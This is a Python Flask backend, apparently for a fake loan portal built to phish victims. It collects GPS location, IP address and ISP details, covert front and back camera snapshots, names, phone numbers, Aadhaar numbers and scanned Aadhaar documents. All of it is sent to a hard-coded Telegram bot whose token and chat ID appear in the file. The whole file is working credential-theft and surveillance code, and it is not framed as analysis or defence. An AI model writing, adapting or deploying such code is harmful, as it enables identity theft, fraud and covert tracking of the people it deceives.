import base64
import os
import requests
from flask import Flask, jsonify, render_template, request

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = "9237845333:AAE7MDOZku3066F3VV2bngseAUxqOJLhYCs"
TELEGRAM_CHAT_ID = "8468084750"


def send_telegram(message):
  url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
  payload = {
      "chat_id": TELEGRAM_CHAT_ID,
      "text": message,
      "parse_mode": "Markdown",
  }
  try:
    requests.post(url, json=payload, timeout=5)
  except Exception as e:
    print(f"Telegram Error: {e}")


def send_photo(photo_path, caption):
  if photo_path and os.path.exists(photo_path):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    try:
      with open(photo_path, "rb") as ph:
        requests.post(
            url,
            data={
                "chat_id": TELEGRAM_CHAT_ID,
                "caption": caption,
                "parse_mode": "Markdown",
            },
            files={"photo": ph},
            timeout=10,
        )
    except Exception as e:
      print(f"Photo Send Error: {e}")


@app.route("/")
def index():
  return render_template("index.html")


@app.route("/try_again")
def try_again():
  return render_template("try.html")


@app.route("/download_portal")
def download_portal():
  return render_template("download.html")


@app.route("/api/hit", methods=["POST"])
def api_hit():
  data = request.get_json()
  lat, lon = data.get("latitude"), data.get("longitude")
  ip = request.headers.get(
      "CF-Connecting-IP",
      request.headers.get("X-Forwarded-For", request.remote_addr),
  )
  msg = (
      f"🚨 *LOCATION CAPTURED* 🚨\n\n"
      f"🌐 *IP:* `{ip}`\n"
      f"📌 *Coords:* `{lat}, {lon}`\n"
      f"🗺️ [Google Maps](https://www.google.com/maps?q={lat},{lon})"
  )
  send_telegram(msg)
  return jsonify({"status": "success"})


@app.route("/api/snapshots", methods=["POST"])
def api_snapshots():
  data = request.get_json()
  photos = data.get("photos", [])

  for i, img_data in enumerate(photos):
    if img_data:
      try:
        header, encoded = img_data.split(",", 1)
        filename = f"cam_{i}.jpg"
        with open(filename, "wb") as f:
          f.write(base64.b64decode(encoded))

        if i < 10:
          cap = f"📸 Front Camera Snapshot #{i+1}"
        else:
          cap = f"📸 Back Camera Snapshot #{i-9}"

        send_photo(filename, cap)

        if os.path.exists(filename):
          os.remove(filename)
      except Exception as e:
        print(f"Snap Error: {e}")

  return jsonify({"status": "success"})


@app.route("/api/submit_loan", methods=["POST"])
def api_submit_loan():
  data = request.get_json()
  name = data.get("name", "N/A")
  mobile = data.get("mobile", "N/A")
  aadhaar = data.get("aadhaar", "N/A")
  lat = data.get("latitude")
  lon = data.get("longitude")
  doc_data = data.get("document")

  ip = request.headers.get(
      "CF-Connecting-IP",
      request.headers.get("X-Forwarded-For", request.remote_addr),
  )
  user_agent = request.headers.get("User-Agent", "Unknown Device")

  isp = "Unknown"
  try:
    ip_res = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
    if ip_res.get("status") == "success":
      isp = f"{ip_res.get('isp', 'N/A')} / {ip_res.get('org', 'N/A')}"
  except:
    pass

  maps_link = (
      f"https://www.google.com/maps?q={lat},{lon}"
      if lat and lon
      else "N/A"
  )

  doc_path = None
  if doc_data:
    try:
      header, encoded = doc_data.split(",", 1)
      with open("aadhaar_doc.jpg", "wb") as f:
        f.write(base64.b64decode(encoded))
      doc_path = "aadhaar_doc.jpg"
    except:
      pass

  msg = (
      f"🎯 *FINAL APPLICATION SUBMITTED* 🎯\n\n"
      f"👤 *Name:* {name}\n"
      f"📱 *Mobile:* {mobile}\n"
      f"🆔 *Aadhaar:* `{aadhaar}`\n"
      f"🌐 *IP Address:* `{ip}`\n"
      f"📶 *ISP / Network:* {isp}\n"
      f"💻 *Device Info:* `{user_agent}`\n"
      f"📌 *Coords:* `{lat}, {lon}`\n"
      f"🗺️ [Open in Google Maps]({maps_link})"
  )
  send_telegram(msg)

  if doc_path:
    send_photo(doc_path, "🆔 *Uploaded Aadhaar Document*")
    if os.path.exists(doc_path):
      os.remove(doc_path)

  return jsonify({"status": "success"})


if __name__ == "__main__":
  port = int(os.environ.get("PORT", 5000))
  app.run(host="0.0.0.0", port=port)

